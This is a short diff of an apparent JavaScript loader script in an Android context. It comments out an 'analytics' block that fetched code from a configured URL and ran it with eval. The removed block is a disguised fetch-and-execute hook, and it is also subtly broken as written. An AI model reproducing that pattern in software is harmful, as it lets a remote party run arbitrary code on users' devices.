@@ -237,10 +237,10 @@ setTimeout(function() {
       sToast("Loader Verified ✅", 1);
 
       // run analytics
-      const ana_code = fetch(cfg.urls.ana);
-      if (ana_code) {
-        try { eval(ana_code); } catch(e) { logs("ana fail"); }
-      }
+      // const ana_code = fetch(cfg.urls.ana);
+      // if (ana_code) {
+        // try { eval(ana_code); } catch(e) { logs("ana fail"); }
+      // }
 
       // load config
       const root = ctx.getExternalFilesDir(null).getAbsolutePath() + cfg.paths.dir;
